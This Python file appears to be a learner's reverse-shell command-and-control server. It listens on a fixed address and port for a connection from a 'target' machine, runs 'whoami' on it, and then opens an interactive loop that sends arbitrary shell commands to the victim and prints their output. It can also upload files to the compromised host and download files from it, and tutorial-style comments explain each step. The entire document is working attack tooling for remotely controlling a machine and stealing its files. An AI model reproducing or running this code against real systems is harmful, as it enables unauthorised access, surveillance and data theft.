import socket
import termcolor
import json
import os
import time

# json library is used to even more easily parse the adata

# upload the file to the atarget machien


def upload_file(file):
    f = open(file, "rb")
    target.send(f.read())


# download function to download the files from target machine


# def download_file(file):
#     f = open(file, "wb")
#     target.settimeout(5)
#     # if we dont set time out it might get stuck and not download the file
#     chunk = target.recv(1024)
#     while chunk:
#         f.write(chunk)
#         try:
#             chunk = target.recv(1024)
#         except socket.timeout as e:
#             # getting this error means that we reach the end of the file
#             break
#     # here we simply are just removeing the statement initiated
#     target.settimeout(None)
#     f.close()


def download_file(file_name):
    f = open(file_name, "wb")
    target.settimeout(2)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        target.settimeout(2)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            print(e)
            break
    target.settimeout(None)
    f.close()


# this function will be used to send the command to the target


def reliable_send(cmd):
    jsondata = json.dumps(cmd)
    target.send(jsondata.encode())
    # in python3 we must encode the data before sending it


# this funtion recieves the result sent to us by the target afte executing our command


def reliable_recieve():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# this func it initiates the data var to eb empty string,
# try to recieve 1024 bytes from the target and add it to the data var
# decode that data before adding it
# then return the json loads of that data


# this fucntion will allow us to communicate with the connected mahine


def target_communication():
    reliable_send("whoami")
    time.sleep(3)
    u = reliable_recieve()
    l = len(u) - 1
    u2 = ""
    for i in range(l):
        u2 += u[i]
    time.sleep(2)
    while True:
        strr = termcolor.colored("[*] {0}@{1} $ ".format(u2, ip[0]), "yellow")
        # strin = f"{strr}{})> ".format(ip[0])
        strr = termcolor.colored(strr, "green")
        command = input(strr)
        # after getting what command we want to execute
        # we will send that command to the target machine with function reliable_sen()
        reliable_send(command)
        if (
            command == "quit"
            or command == "exit"
            or command == "bye"
            or command == "deactivate"
            or command == "logout"
        ):
            print(termcolor.colored("[-]", "red"), "logging out...")
            break
        elif command[:8] == "download":
            # download function will be used to download the files from target machine
            # that means target will be uploading it
            # upload command will upload the files from attacking machine
            # that means target will download the files
            download_file(command[9:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        elif command == "clear" or command == "cls":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        else:
            # we write another function that recives the output of our command execution
            result = reliable_recieve()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# socket.AF_INET, socket.SOCK_STREAM they are here to tell the program that
# we are making a connection over IPv4 and for connecting we are using tcp respectively

# this command binds the ip addres and the port
# sock.bind(('your IP', 5555))
sock.bind(("172.16.222.86", 5555))

# Now we have to set up a listener
print(termcolor.colored("[*]", "blue"), "Listening for incoming connections...")

sock.listen(5)
# this command is used to start the listener and the 5 in parenthesis means
# that we allow atmax 5 users to conect to our server
# now our program will be stuck here until the connection has been established

target, ip = sock.accept()
# here we are storing the ip address of the connected machine
# here .accept() is simply just accepting  the incoming connections
# here target stores the socket object of incoing connection
# and ip contains the ip address of the target
print(termcolor.colored("[+]", "green"), " Target Connected From:", str(ip))

target_communication()
